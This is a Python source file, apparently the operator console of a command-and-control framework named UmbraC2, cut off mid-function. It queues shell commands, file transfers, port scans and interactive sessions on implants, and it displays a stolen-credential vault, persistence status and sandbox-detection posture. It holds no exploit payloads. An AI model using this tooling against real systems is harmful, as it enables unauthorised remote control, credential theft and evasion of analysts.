"""`umbra` -- the UmbraC2 operator console.

Two ways to drive it:

    umbra --server 127.0.0.1:4002 --operator alice agents
    umbra --server 127.0.0.1:4002 --operator alice            # interactive shell

The operator token is read from --token, --token-file or $UMBRA_OPERATOR_TOKEN,
in that order of precedence.  It is the *operator* secret; agents use a
different PSK, so a compromised operator console cannot enrol new implants.
"""

from __future__ import annotations

import argparse
import getpass
import json
import os
import shlex
import sys
import threading
import time
from typing import Any, Dict, List, Optional

from . import __version__, crypto, db, image, netio, wire
from .client import CHUNK_MAX, OperatorClient, OperatorError
from .vpn import _table, print_pivots, print_vpn_peers, print_vpn_status

BANNER = r"""
  _   _ __  __ ___  ____      _    ____
 | | | |  \/  | _ \|  _ \    / \  / ___|
 | |_| | |\/| | |_) | |_) |  / _ \| |
 |  _  | |  | |  _ <|  _ <  / ___ \ |___
 |_| |_|_|  |_|_| \_\_| \_\/_/   \_\____|
 umbra/v1 operator console -- authorised lab use only
"""


# ---------------------------------------------------------------------------
# output helpers
# ---------------------------------------------------------------------------
def fmt_ts(value: Any) -> str:
    try:
        ts = int(value)
    except (TypeError, ValueError):
        return str(value)
    if ts <= 0:
        return "-"
    return time.strftime("%Y-%m-%d %H:%M:%SZ", time.gmtime(ts))


def short(text: Any, limit: int = 72) -> str:
    s = str(text if text is not None else "")
    s = s.replace("\r", "").strip()
    if len(s) > limit:
        return s[: limit - 1] + "…"
    return s


def json_default(value: Any) -> Any:
    """Make bytes render as text (or hex if binary) in --json output."""
    if isinstance(value, (bytes, bytearray)):
        raw = bytes(value)
        try:
            return raw.decode("utf-8")
        except UnicodeDecodeError:
            return "hex:" + raw.hex()
    return str(value)


def emit(payload: Any) -> None:
    """One canonical JSON shape: bytes as text, keys sorted.

    It lives at module level so the helpers that wait for a task result can
    print it too, not only the command dispatcher.
    """
    print(json.dumps(payload, indent=2, sort_keys=True, default=json_default))


def decode_out(value: Any) -> str:
    if isinstance(value, (bytes, bytearray)):
        try:
            return bytes(value).decode("utf-8", "replace")
        except Exception:  # pragma: no cover
            return repr(value)
    return str(value if value is not None else "")


def table(headers: List[str], rows: List[List[Any]], widths: Optional[List[int]] = None) -> str:
    if not rows:
        return "(no rows)"
    cols = len(headers)
    widths = widths or [0] * cols
    rendered: List[List[str]] = [[str(c) for c in headers]]
    for row in rows:
        rendered.append([short(c, widths[i]) if widths[i] else str(c) for i, c in enumerate(row)])
    sizes = [max(len(r[i]) for r in rendered) for i in range(cols)]
    out = []
    for idx, row in enumerate(rendered):
        line = "  ".join(cell.ljust(sizes[i]) for i, cell in enumerate(row))
        out.append(line.rstrip())
        if idx == 0:
            out.append("  ".join("-" * sizes[i] for i in range(cols)))
    return "\n".join(out)


def print_agents(agents: List[Dict[str, Any]]) -> None:
    if not agents:
        print("no agents have checked in yet")
        return
    rows = [
        [
            a.get("id", "?"),
            a.get("host", "?"),
            f"{a.get('os', '?')}/{a.get('arch', '?')}",
            a.get("user", "?"),
            a.get("state", "?"),
            a.get("transport", "?"),
            f"{a.get('sleep', '?')}s/{a.get('jitter', '?')}%",
            ",".join(str(t) for t in (a.get("tags") or [])) or "-",
            fmt_ts(a.get("last_seen") if not isinstance(a.get("last_seen"), int) else a.get("last_seen")),
        ]
        for a in agents
    ]
    print(table(["ID", "HOST", "OS", "USER", "STATE", "TRANSPORT", "BEACON", "TAGS", "LAST SEEN"], rows))


def print_postures(rows: List[Dict[str, Any]], as_json: bool = False) -> None:
    """The posture of the fleet.

    The posture is what the implant thinks of the host it runs on: a
    virtual machine, a lab machine, an analyst's sandbox.  An operator
    reads it before the first task of the day, not after it.
    """
    if as_json:
        emit(rows)
        return
    if not rows:
        print("no agent has reported a posture yet")
        return
    print(f"{'AGENT':<24} {'POSTURE':<26} {'CONF':>5}  {'SILENT':>6}  {'KILL':>5}")
    for row in rows:
        print(f"{str(row['agent'])[:24]:<24} {str(row['label'])[:26]:<26} "
              f"{row['confidence']:>5}  {'yes' if row['silent'] else 'no':>6}  "
              f"{'yes' if row['killswitch'] else 'no':>5}")
    sandboxes = len([r for r in rows if r["sandbox"]])
    silent = len([r for r in rows if r["silent"]])
    armed = len([r for r in rows if r["killswitch"]])
    print(f"{len(rows)} hosts, {sandboxes} in a sandbox, {silent} silent, {armed} with a kill switch")


def print_credentials(rows: List[Dict[str, Any]], as_json: bool = False,
                      with_secrets: bool = False) -> None:
    """The vault of the engagement.

    The table is what an operator reads before they ask for the values:
    the kind of the material, the account it belongs to, the host it came
    from and how sure the implant was.  The value itself only appears when
    the operator asked for it.
    """
    if as_json:
        emit(rows)
        return
    if not rows:
        print("the vault is empty")
        return
    print(f"{'AGENT':<20} {'KIND':<10} {'ACCOUNT':<26} {'TARGET':<24} "
          f"{'CONF':>5}  {'SOURCE':<10} {'VALUE':<12}")
    for row in rows:
        if with_secrets:
            # The export is the one place where the value is shown, and it
            # is shown whole: a value an operator cannot copy is not a
            # value they asked for.
            value = str(row.get("secret", "") or "")
        else:
            value = "(redacted)"
        print(f"{str(row.get('agent_id', ''))[:20]:<20} "
              f"{str(row.get('kind', ''))[:10]:<10} "
              f"{str(row.get('account', ''))[:26]:<26} "
              f"{str(row.get('target', ''))[:24]:<24} "
              f"{int(row.get('confidence', 0) or 0):>5}  "
              f"{str(row.get('source', ''))[:10]:<10} {value:<12}")
    kinds: Dict[str, int] = {}
    for row in rows:
        kind = str(row.get("kind", "?"))
        kinds[kind] = kinds.get(kind, 0) + 1
    summary = ", ".join(f"{count} {kind}" for kind, count in sorted(kinds.items()))
    print(f"{len(rows)} records: {summary}")


def print_persistence(rows: List[Dict[str, Any]], as_json: bool = False) -> None:
    """The persistence of the fleet.

    The table is the handover artefact: the hosts that carry an entry, the
    ones whose entry is broken, and the techniques that have to be removed
    when the engagement ends.
    """
    if as_json:
        print(json.dumps(rows, indent=2, default=str))
        return
    if not rows:
        print("no agents have checked in yet")
        return
    table_rows = [
        [
            row.get("agent", "?"),
            row.get("host", "?"),
            str(row.get("entries", 0)),
            str(row.get("broken", 0)),
            row.get("state", "?"),
            ", ".join(row.get("methods") or []) or "-",
        ]
        for row in rows
    ]
    print(table(["AGENT", "HOST", "ENTRIES", "BROKEN", "STATE", "TECHNIQUES"], table_rows))
    covered = sum(1 for row in rows if row.get("state") == "covered")
    broken = sum(1 for row in rows if row.get("state") == "broken")
    print(f"{covered} covered, {broken} broken, {len(rows) - covered - broken} without persistence")


def print_whoami(data: Dict[str, Any]) -> None:
    caps = data.get("capabilities") or []
    print(f"operator : {data.get('name')}")
    print(f"role     : {data.get('role')}")
    print(f"peer     : {data.get('peer')} ({data.get('transport')})")
    print(f"since    : {data.get('since')}")
    if data.get("focus"):
        print(f"focus    : {data['focus']}")
    print(f"commands : {len(caps)} allowed")
    if caps:
        print("           " + " ".join(sorted(caps)))


def print_chat(messages: List[Dict[str, Any]]) -> None:
    if not messages:
        print("no chat messages yet")
        return
    for m in messages:
        role = m.get("role") or "?"
        to = m.get("to") or ""
        # A directed message is marked, because the room sees it in the history:
        # addressing is a label for the team, not a private channel.
        arrow = f" -> {to}" if to else ""
        print(f"[{fmt_ts(m.get('at'))}] {m.get('from')}{arrow} ({role}): {m.get('text')}")


def print_schedules(schedules: List[Dict[str, Any]]) -> None:
    if not schedules:
        print("no recurring tasks")
        return
    rows = [
        [
            sc.get("id", "?"),
            sc.get("agent_id", "?"),
            sc.get("kind", "?"),
            f"{sc.get('every', 0)}s",
            str(sc.get("runs", 0)),
            "on" if sc.get("enabled", True) else "off",
            fmt_ts(sc.get("next_run")),
            sc.get("by", "?"),
        ]
        for sc in schedules
    ]
    print(table(["ID", "AGENT", "KIND", "EVERY", "RUNS", "STATE", "NEXT RUN", "BY"], rows))


def print_operators(operators: List[Dict[str, Any]]) -> None:
    if not operators:
        print("no operator consoles connected")
        return
    rows = [
        [
            o.get("name", "?"),
            o.get("role", "?"),
            o.get("focus") or "-",
            f"{o.get('idle_sec', 0)}s",
            o.get("peer", "?"),
            o.get("transport", "?"),
            str(o.get("backlog", 0)),
        ]
        for o in operators
    ]
    print(table(["OPERATOR", "ROLE", "FOCUS", "IDLE", "PEER", "TRANSPORT", "BACKLOG"], rows))


def print_tasks(tasks: List[Dict[str, Any]]) -> None:
    if not tasks:
        print("no tasks yet")
        return
    rows = []
    for t in tasks:
        rows.append(
            [
                t.get("id", "?"),
                t.get("kind", "?"),
                t.get("state", "?"),
                t.get("claimed_by") or "-",
                t.get("code", "?"),
                short(decode_out(t.get("out", "")), 60) or "-",
                fmt_ts(t.get("created")),
            ]
        )
    print(table(["TASK", "KIND", "STATE", "CLAIMED BY", "CODE", "OUTPUT", "CREATED"], rows))


def print_alerts(rules: List[Dict[str, Any]]) -> None:
    if not rules:
        print("the server has no alert rules")
        return
    rows = [
        [
            r.get("name", "?"),
            r.get("event", "?"),
            r.get("tag", "-") or "-",
            r.get("agent", "-") or "-",
            r.get("task_kind", "-") or "-",
            f"{r.get('cooldown_s', 0)}s",
        ]
        for r in rules
    ]
    print(table(["NAME", "EVENT", "TAG", "AGENT", "KIND", "COOLDOWN"], rows))


def build_report(client: OperatorClient, agent_id: str, limit: int,
                 state: Optional["db.StateStore"] = None) -> str:
    """Write the report of one agent as a Markdown document.

    The report is what an operator hands over at the end of an engagement:
    what the host was, what was done on it and what was found.  It is built
    from the server's own record, so it is the same for everybody.
    """
    info = client.agent_info(agent_id)
    tasks = client.tasks(agent_id, limit)
    lines: List[str] = []
    lines.append(f"# {agent_id}")
    lines.append("")
    lines.append(f"_written {time.strftime('%Y-%m-%d %H:%M:%S %Z')}_")
    lines.append("")

    lines.append("## The host")
    lines.append("")
    for key in ("os", "arch", "user", "hostname", "transport", "transport_addr",
                "sleep", "jitter", "tags", "first_seen", "last_seen", "state"):
        value = info.get(key)
        if value in (None, "", [], {}):
            continue
        if isinstance(value, (list, tuple)):
            value = ", ".join(str(v) for v in value)
        lines.append(f"- **{key}**: {value}")
    lines.append("")

    lines.append("## The tasks")
    lines.append("")
    if not tasks:
        lines.append("_no task was run on this agent_")
    else:
        lines.append("| when | kind | state | note |")
        lines.append("| --- | --- | --- | --- |")
        for task in tasks[:limit]:
            when = task.get("completed") or task.get("created") or ""
            when = str(when)[:19].replace("T", " ")
            kind = task.get("kind", "")
            state = task.get("state", "")
            err = str(task.get("err", "") or "")
            note = err[:80] if err else ""
            lines.append(f"| {when} | {kind} | {state} | {note} |")
    lines.append("")

    if state is not None:
        try:
            notes = state.notes(agent_id, limit)
        except Exception:  # noqa: BLE001 - the notebook is a convenience
            notes = []
        if notes:
            lines.append("## The notes")
            lines.append("")
            for note in notes:
                when = str(note.get("at", ""))[:19].replace("T", " ")
                lines.append(f"- **{when}** {note.get('text', '')}")
            lines.append("")

    return "\n".join(lines) + "\n"


def build_engagement_report(client: OperatorClient, limit: int,
                             state: Optional["db.StateStore"] = None) -> str:
    """Write the report of the whole engagement as a Markdown document.

    It is the document that goes with the handover: every host that was
    touched, and every task that was run.
    """
    agents = client.agents()
    lines: List[str] = []
    lines.append("# The engagement")
    lines.append("")
    lines.append(f"_{len(agents)} hosts_")
    lines.append("")

    lines.append("## The hosts")
    lines.append("")
    lines.append("| agent | host | os | user | transport | state | tags |")
    lines.append("| --- | --- | --- | --- | --- | --- | --- |")
    for agent in agents:
        tags = ", ".join(str(t) for t in (agent.get("tags") or []))
        lines.append("| {} | {} | {} | {} | {} | {} | {} |".format(
            agent.get("id", ""), agent.get("host", ""), agent.get("os", ""),
            agent.get("user", ""), agent.get("transport", ""),
            agent.get("state", ""), tags))
    lines.append("")

    lines.append("## The tasks")
    lines.append("")
    tasks = client.tasks("", limit)
    if not tasks:
        lines.append("_no task was run_")
    else:
        lines.append("| when | agent | kind | state | note |")
        lines.append("| --- | --- | --- | --- | --- |")
        for task in tasks[:limit]:
            when = task.get("completed") or task.get("created") or ""
            when = str(when)[:19].replace("T", " ")
            err = str(task.get("err", "") or "")
            lines.append("| {} | {} | {} | {} | {} |".format(
                when, task.get("agent_id", ""), task.get("kind", ""),
                task.get("state", ""), err[:80]))
    lines.append("")

    if state is not None:
        try:
            notes = state.notes("", limit)
        except Exception:  # noqa: BLE001 - the notebook is a convenience
            notes = []
        if notes:
            lines.append("## The notes")
            lines.append("")
            for note in notes:
                when = str(note.get("at", ""))[:19].replace("T", " ")
                lines.append("- **{}** {} ({})".format(
                    when, note.get("text", ""), note.get("agent", "")))
            lines.append("")

    return "\n".join(lines) + "\n"


def run_task_and_wait(client: OperatorClient, console: Console, agent_id: str,
                      kind: str, task_args: Dict[str, Any], wait: bool,
                      timeout: float, as_json: bool) -> None:
    """Queue a task and, when asked, wait for its result."""
    task_id = client.submit(agent_id, kind, task_args)
    console.note_task(task_id, agent_id, kind, task_args)
    if as_json and not wait:
        emit({"task_id": task_id, "agent": agent_id, "kind": kind})
    else:
        print(f"queued {task_id}")
    if wait:
        result = client.wait_for_result(task_id, timeout=timeout)
        console.note_result(task_id, result)
        emit(result) if as_json else print_task_result(result)


def print_task_result(task: Dict[str, Any]) -> None:
    print(f"task    : {task.get('id')}")
    print(f"agent   : {task.get('agent_id')}")
    print(f"kind    : {task.get('kind')}")
    print(f"state   : {task.get('state')}")
    print(f"exit    : {task.get('code')}")
    if task.get("claimed_by"):
        print(f"claimed : {task['claimed_by']}")
    if task.get("err"):
        print(f"error   : {task['err']}")
    meta = task.get("meta") or {}
    if meta:
        # Transfer metadata (total/offset/eof/sha256) and anything else the
        # beacon attached to the RESULT; sorted so the output is stable.
        items = ", ".join(f"{k}={meta[k]}" for k in sorted(meta))
        print(f"meta    : {items}")
    out = decode_out(task.get("out", ""))
    if out:
        print("--- output " + "-" * 50)
        print(out.rstrip())


def print_armory(payload: Dict[str, Any]) -> None:
    """Render the extension store: the catalogue and what is installed."""
    entries = payload.get("entries") or []
    installed = payload.get("installed") or []
    print(f"signing key verified: {'yes' if payload.get('verified') else 'no'}")
    print("catalogue:")
    rows = [
        [
            e.get("name", "?"),
            e.get("version", "?"),
            e.get("os", "?"),
            e.get("arch", "?"),
            e.get("format", "?"),
            e.get("size", 0),
            short(e.get("description", ""), 40),
        ]
        for e in entries
    ]
    print(table(["NAME", "VERSION", "OS", "ARCH", "FORMAT", "SIZE", "DESCRIPTION"], rows))
    print("installed:")
    rows = [
        [
            e.get("name", "?"),
            e.get("version", "?"),
            e.get("size", 0),
            short(e.get("sha256", ""), 16),
            fmt_ts(e.get("installed")),
        ]
        for e in installed
    ]
    print(table(["NAME", "VERSION", "SIZE", "SHA256", "INSTALLED"], rows))


def print_aliases(aliases: List[Dict[str, Any]]) -> None:
    """Render the saved command namespace."""
    rows = [
        [
            a.get("name", "?"),
            a.get("kind", "?"),
            a.get("extension", "-"),
            a.get("by", "-"),
            fmt_ts(a.get("created")),
            short(a.get("description", ""), 36),
        ]
        for a in aliases
    ]
    print(table(["NAME", "KIND", "EXTENSION", "BY", "CREATED", "DESCRIPTION"], rows))


def print_team(payload: Dict[str, Any]) -> None:
    """Render the team snapshot: agents, operators and the chat log."""
    agents = payload.get("agents") or []
    operators = payload.get("operators") or []
    chat = payload.get("chat") or []
    print(f"server time: {fmt_ts(payload.get('server_time'))}  version: {payload.get('version', '?')}")
    print(f"agents ({len(agents)}):")
    for a in agents:
        print(f"  {a.get('id', '?'):<24} {a.get('host', '?'):<20} {a.get('state', '?')}")
    print(f"operators ({len(operators)}):")
    for o in operators:
        focus = o.get("focus") or "-"
        print(f"  {o.get('name', '?'):<16} {o.get('role', '?'):<10} focus={focus}")
    print(f"chat ({len(chat)}):")
    for m in chat:
        target = f" -> {m['to']}" if m.get("to") else ""
        print(f"  [{fmt_ts(m.get('at'))}] {m.get('from', '?')}{target}: {short(m.get('text', ''), 80)}")


def print_audit(payload: Dict[str, Any], stream: Any = None) -> None:
    """Render the audit trail: one line per operator action, newest first."""
    out = stream or sys.stdout
    entries = payload.get("entries") or []
    if not payload.get("enabled", True):
        print("audit log is disabled on this server (audit_file is empty)", file=out)
        return
    if not entries:
        print("no recorded operator actions", file=out)
        return
    for e in entries:
        mark = "ok " if e.get("ok") else "ERR"
        detail = short(e.get("detail") or "", 40)
        extra = ""
        if e.get("agent_id"):
            extra += f" agent={e['agent_id']}"
        if e.get("task_id"):
            extra += f" task={e['task_id']}"
        if e.get("err"):
            extra += f" err={short(e['err'], 40)!r}"
        if detail:
            extra += f" {detail}"
        print(
            f"[{fmt_ts(e.get('at'))}] {mark} {str(e.get('operator')):<12} "
            f"{str(e.get('cmd')):<14}{extra} ({e.get('ms', 0)} ms)",
            file=out,
        )


def watch_events(client: OperatorClient, limit: int = 0, as_json: bool = False) -> int:
    """Block, printing events as they arrive, until Ctrl-C or `limit` events.

    `umbra watch` exists because events are the only way to notice a new beacon
    or a finished task without polling: the console prints them on stderr while
    a command runs, but a dedicated stream is what an operator leaves open on a
    second terminal.
    """
    seen = 0
    try:
        while True:
            ev = client.next_event(timeout=3600.0)
            if ev is None:
                continue
            if as_json:
                print(json.dumps({"kind": ev.get("kind"), "at": ev.get("at"),
                                  "agent_id": ev.get("agent_id"), "task_id": ev.get("task_id"),
                                  "data": ev.get("data") or {}},
                                 sort_keys=True, default=json_default), flush=True)
            else:
                print_event(ev, stream=sys.stdout)
                sys.stdout.flush()
            seen += 1
            if limit and seen >= limit:
                return 0
    except KeyboardInterrupt:
        print(f"\n{seen} event(s)", file=sys.stderr)
        return 0


def print_artifacts(rows: List[Dict[str, Any]]) -> None:
    """The artifacts the team server holds."""
    if not rows:
        print("the artifact store is empty")
        return
    table_rows = [
        [
            str(a.get("name", "?")),
            str(a.get("size", "?")),
            str(a.get("sha256", ""))[:16],
            fmt_ts(a.get("created")),
        ]
        for a in rows
    ]
    print(table(["NAME", "SIZE", "SHA256", "CREATED"], table_rows))


def print_sessions(rows: List[Dict[str, Any]]) -> None:
    """Print the interactive sessions that are open."""
    if not rows:
        print("no session is open")
        return
    print(table(
        ["session", "agent", "task", "bytes", "last"],
        [[row.get("id", ""), row.get("agent_id", ""), row.get("task_id", ""),
          str(row.get("bytes", 0)), fmt_ts(row.get("last", 0))]
         for row in rows]))


def print_events(rows: List[Dict[str, Any]]) -> None:
    """Print a list of journal events, oldest first."""
    if not rows:
        print("no event")
        return
    for ev in rows:
        print_event(ev)


def print_event(ev: Dict[str, Any], stream: Any = None) -> None:
    kind = ev.get("kind", "?")
    at = fmt_ts(ev.get("at"))
    agent = ev.get("agent_id", "")
    data = ev.get("data") or {}
    detail = ""
    if kind == "task.result":
        detail = f"task={ev.get('task_id')} exit={data.get('code')}"
        if data.get("binary"):
            # The event carries only a size for binary payloads; the bytes are
            # in task.get.
            detail += f" binary={data.get('size', 0)}B"
        else:
            out = decode_out(data.get("output", ""))
            if out:
                detail += f" out={short(out, 60)!r}"
        if data.get("meta"):
            detail += " meta=" + ",".join(sorted(str(k) for k in data["meta"]))
    elif kind in ("agent.new", "agent.online"):
        parts = [f"{k}={data[k]}" for k in ("host", "os", "transport") if data.get(k)]
        detail = " ".join(parts)
    elif kind == "task.queued":
        detail = f"task={ev.get('task_id')} kind={data.get('kind')}"
    elif kind == "beacon.error":
        detail = f"code={data.get('code')} {short(str(data.get('msg') or ''), 60)!r}"
    elif kind == "agent.policy":
        detail = f"sleep={data.get('sleep')} jitter={data.get('jitter')}"
    print(f"[{at}] {kind:<14} {agent:<20} {detail}".rstrip(), file=stream or sys.stdout)


# ---------------------------------------------------------------------------
# client wrapper
# ---------------------------------------------------------------------------
class Console:
    def __init__(self, client: OperatorClient, *, watch: bool = False,
                 store: Optional[db.StateStore] = None) -> None:
        self.client = client
        self.watch = watch
        self.current_agent: Optional[str] = None
        # The local notebook is optional: the console works without it.
        self.store = store
        self.session = 0

    # -- notebook --------------------------------------------------------
    def note_task(self, task_id: str, agent: str, kind: str,
                  args: Any = None) -> None:
        """Record a queued task in the local state database."""
        if self.store is None or not task_id:
            return
        try:
            self.store.record_task(task_id, agent, kind, args, self.session)
        except Exception:  # noqa: BLE001 - never break the console
            pass

    def note_result(self, task_id: str, task: Dict[str, Any]) -> None:
        """Record a task result in the local state database."""
        if self.store is None or not task_id:
            return
        try:
            self.store.record_result(
                task_id,
                int(task.get("code") or 0),
                task.get("out") or b"",
                str(task.get("err") or ""),
            )
        except Exception:  # noqa: BLE001 - never break the console
            pass

    def _resolve(self, agent: Optional[str]) -> str:
        target = agent or self.current_agent
        if not target:
            raise OperatorError("no agent selected (use `use <id>` or pass an id)")
        return target

    def run_command(self, line: str) -> bool:
        """Execute one console command. Returns False to exit."""
        try:
            argv = shlex.split(line)
        except ValueError as exc:
            print(f"parse error: {exc}")
            return True
        if not argv:
            return True
        cmd, rest = argv[0].lower(), argv[1:]
        try:
            if cmd in ("quit", "exit", "q"):
                return False
            if cmd in ("help", "?", "h"):
                print_help()
            elif cmd == "agents" or cmd == "ls":
                # `agents state=online tag=dc` narrows the inventory with the
                # same filter language the server understands.
                print_agents(self.client.agents(**parse_filter(" ".join(rest))))
            elif cmd == "alerts":
                print_alerts(self.client.alerts())
            elif cmd == "triage":
                if not rest:
                    print("usage: triage <path>")
                    return True
                task_id = self.client.submit(self.target(), "triage", {"path": rest[0]})
                self.note_task(task_id, self.target(), "triage", {"path": rest[0]})
                print_task_result(self.client.wait_for_result(task_id))
            elif cmd == "find":
                options = parse_filter(" ".join(rest))
                path = options.pop("path", ".")
                content = options.pop("content", "")
                name = rest[0] if rest else ""
                task_id = self.client.submit(self.target(), "find",
                                             {"path": path, "name": name, "content": content})
                self.note_task(task_id, self.target(), "find", {"path": path, "name": name})
                print_task_result(self.client.wait_for_result(task_id))
            elif cmd == "netinfo":
                task_id = self.client.submit(self.target(), "netinfo", {})
                self.note_task(task_id, self.target(), "netinfo", {})
                print_task_result(self.client.wait_for_result(task_id))
            elif cmd == "scan":
                # scan <target> [ports=22,80,443]
                if not rest:
                    print("usage: scan <target> [ports=22,80,443]")
                    return True
                options = parse_filter(" ".join(rest[1:]))
                task_args = {"host": rest[0],
                             "ports": options.get("ports", "22,80,443")}
                task_id = self.client.submit(self.target(), "scan", task_args)
                self.note_task(task_id, self.target(), "scan", task_args)
                print_task_result(self.client.wait_for_result(task_id))
            elif cmd == "resolve":
                if not rest:
                    print("usage: resolve <host>")
                    return True
                task_args = {"host": rest[0]}
                task_id = self.client.submit(self.target(), "resolve", task_args)
                self.note_task(task_id, self.target(), "resolve", task_args)
                print_task_result(self.client.wait_for_result(task_id))
            elif cmd == "env":
                options = parse_filter(" ".join(rest))
                task_args = {"filter": options.get("filter", "")}
                task_id = self.client.submit(self.target(), "env", task_args)
                self.note_task(task_id, self.target(), "env", task_args)
                print_task_result(self.client.wait_for_result(task_id))
            elif cmd == "touch":
                if not rest:
                    print("usage: touch <path>")
                    return True
                task_args = {"path": rest[0]}
                task_id = self.client.submit(self.target(), "touch", task_args)
                self.note_task(task_id, self.target(), "touch", task_args)
                print_task_result(self.client.wait_for_result(task_id))
            elif cmd == "artifact":
                # artifact list | put <file> [name] | get <name> <file> | remove <name>
                if not rest:
                    print("usage: artifact list|put <file>|get <name> <file>|remove <name>")
                    return True
                action = rest[0]
                if action == "list":
                    print_artifacts(self.client.artifact_list())
                elif action == "put" and len(rest) > 1:
                    name = rest[2] if len(rest) > 2 else os.path.basename(rest[1])
                    info = self.client.artifact_upload(name, rest[1])
                    print(f"stored {info.get('name')} ({info.get('size')} bytes)")
                elif action == "get" and len(rest) > 2:
                    info = self.client.artifact_download(rest[1], rest[2])
                    print(f"wrote {info.get('bytes')} bytes to {info.get('local')}")
                elif action == "remove" and len(rest) > 1:
                    self.client.artifact_remove(rest[1])
                    print(f"removed {rest[1]}")
                else:
                    print("usage: artifact list|put <file>|get <name> <file>|remove <name>")
            elif cmd == "panic":
                # The end of an engagement on the target side: the operator
                # says the word, so a stray keystroke does not burn the fleet.
                try:
                    answer = input("type 'panic' to continue: ").strip()
                except (EOFError, KeyboardInterrupt):
                    print()
                    print("nothing was changed")
                    return True
                if answer != "panic":
                    print("nothing was changed")
                    return True
                if "--all" in rest:
                    data = self.client.panic(all_agents=True)
                else:
                    target = rest[0] if rest else self.target()
                    data = self.client.panic([target])
                print(f"panicked {data.get('count', 0)} agent(s)")
                for agent_id in data.get("panicked", []):
                    print(f"  {agent_id}")
            elif cmd == "chain":
                # chain <agent> shell:{"cmd":"id"} shell:{"cmd":"cat {{output}}"}
                if not rest:
                    print("usage: chain <agent> <kind>:<json> ...")
                    return True
                stages = []
                for item in rest[1:]:
                    kind, _, raw = item.partition(":")
                    args = json.loads(raw) if raw.strip() else {}
                    stages.append({"kind": kind, "args": args})
                data = self.client.submit_chain(rest[0], stages)
                print(f"chain {data.get('chain_id', '?')} queued ({len(stages)} stages)")
            elif cmd == "session":
                # session [cmd] -- an interactive shell on the selected agent.
                opened = self.client.open_session(self.target(),
                                                   rest[0] if rest else "")
                task_id = str(opened.get("task_id", ""))
                print(f"session task {task_id} queued (type to send, ctrl-c to stop)")
                stream_session(self.client, self, self.target(), task_id, 300.0)
            elif cmd == "tag":
                if len(rest) < 2:
                    print("usage: tag <agent> <label>...")
                    return True
                mode = "remove" if "--remove" in rest else ("set" if "--set" in rest else "add")
                labels = [t for t in rest[1:] if not t.startswith("--")]
                data = self.client.tag_agents(labels, mode=mode, agents=[rest[0]])
                print(f"{mode}: {', '.join(labels)} on {len(data.get('updated', []))} agent(s)")
            elif cmd == "policy":
                if len(rest) < 2:
                    print("usage: policy <agent> sleep=60 jitter=35 [obfuscate=0]")
                    return True
                options = parse_filter(" ".join(rest[1:]))
                sleep = int(options.get("sleep", 60))
                jitter = int(options.get("jitter", 20))
                obfuscate = None
                if "obfuscate" in options:
                    obfuscate = options["obfuscate"] not in ("0", "false", "no")
                data = self.client.set_policy(sleep, jitter, obfuscate=obfuscate,
                                              agents=[rest[0]])
                print(f"policy pushed to {len(data.get('updated', []))} agent(s): "
                      f"sleep {sleep}s, jitter {jitter}%")
            elif cmd == "use":
                if not rest:
                    print(f"current agent: {self.current_agent or '(none)'}")
                else:
                    self.current_agent = rest[0]
                    print(f"current agent: {self.current_agent}")
                    # Tell the team; a shared engagement should not need a
                    # second message to say who is looking at what.
                    try:
                        self.client.focus(rest[0])
                    except OperatorError as exc:
                        print(f"focus not shared: {exc}")
            elif cmd == "info":
                data = self.client.agent_info(self._resolve(rest[0] if rest else None))
                print(json.dumps(data, indent=2, default=str, sort_keys=True))
            elif cmd == "run":
                if not rest:
                    print("usage: run <command>")
                    return True
                self._submit_and_maybe_wait("shell", {"cmd": " ".join(rest)}, watch=False)
            elif cmd == "exec":
                if not rest:
                    print('usage: exec <kind> [json-args]   e.g. exec sysinfo')
                    return True
                kind = rest[0]
                args = json.loads(" ".join(rest[1:])) if len(rest) > 1 else {}
                self._submit_and_maybe_wait(kind, args, watch=True)
            elif cmd in ("get", "download"):
                if len(rest) < 2:
                    print("usage: get <remote-path> <local-path>")
                    return True
                info = self.client.download_file(
                    self._resolve(None), rest[0], rest[1], progress=_progress_printer())
                print(f"downloaded {info['bytes']} bytes -> {info['local']} ({info['chunks']} chunk(s))")
            elif cmd in ("put", "upload"):
                if len(rest) < 2:
                    print("usage: put <local-path> <remote-path>")
                    return True
                info = self.client.upload_file(
                    self._resolve(None), rest[0], rest[1], progress=_progress_printer())
                print(f"uploaded {info['bytes']} bytes -> {info['path']} ({info['chunks']} chunk(s))")
            elif cmd == "tasks":
                limit = int(rest[0]) if rest else 20
                print_tasks(self.client.tasks(self._resolve(None), limit))
            elif cmd == "result":
                if not rest:
                    print("usage: result <task-id>")
                    return True
                print_task_result(self.client.task(rest[0]))
            elif cmd == "retry":
                if not rest:
                    print("usage: retry <task-id>")
                    return True
                res = self.client.retry(rest[0])
                print(f"queued {res.get('task_id')} (the task {rest[0]} is retried)")
            elif cmd == "sessions":
                print_sessions(self.client.sessions())
            elif cmd == "events":
                limit = int(rest[0]) if rest else 50
                print_events(self.client.events(0, limit).get("events") or [])
            elif cmd == "watch":
                self.watch = (rest[0].lower() not in ("off", "0", "false")) if rest else (not self.watch)
                print(f"event watch: {'on' if self.watch else 'off'}")
            elif cmd == "sleep":
                if len(rest) < 2:
                    print("usage: sleep <seconds> [jitter%]")
                    return True
                jitter = int(rest[1]) if len(rest) > 1 else 20
                self.client.set_sleep(self._resolve(None), int(rest[0]), jitter)
                print("beacon policy updated")
            elif cmd == "kill":
                res = self.client.rpc("agents.kill", {"id": self._resolve(rest[0] if rest else None)})
                print("kill task queued" if res.ok else f"error: {res.error}")
            elif cmd in ("cancel", "kill-task"):
                if not rest:
                    print("usage: cancel <task-id>")
                    return True
                try:
                    self.client.cancel(rest[0])
                    print(f"cancelled {rest[0]}")
                except OperatorError as exc:
                    print(f"error: {exc}")
            elif cmd == "db":
                if self.store is None:
                    print("no local database (start the console with --db PATH)")
                    return True
                action = rest[0].lower() if rest else "stats"
                value = rest[1] if len(rest) > 1 else ""
                try:
                    if action == "stats":
                        stats = self.store.stats()
                        print(f"tasks {stats['tasks']}, results {stats['results']}, "
                              f"notes {stats['notes']} ({stats['path']})")
                    elif action == "tasks":
                        print_db_tasks(self.store.tasks(value, 20))
                    elif action == "results":
                        print_db_results(self.store.results(value, 20))
                    elif action == "notes":
                        print_db_notes(self.store.notes(value, 20))
                    elif action == "search":
                        print_db_search(self.store.search(value, 20))
                    elif action == "note":
                        if not value:
                            print("usage: db note \"what I found\"")
                            return True
                        note_id = self.store.add_note(value, "")
                        print(f"note {note_id} recorded")
                    else:
                        print(f"unknown db action {action!r} "
                              "(stats|tasks|results|notes|search|note)")
                except db.StateError as exc:
                    print(f"local state error: {exc}")
            elif cmd in ("audit", "log"):
                limit = int(rest[0]) if rest else 30
                print_audit(self.client.audit(limit))
            elif cmd in ("whoami", "me"):
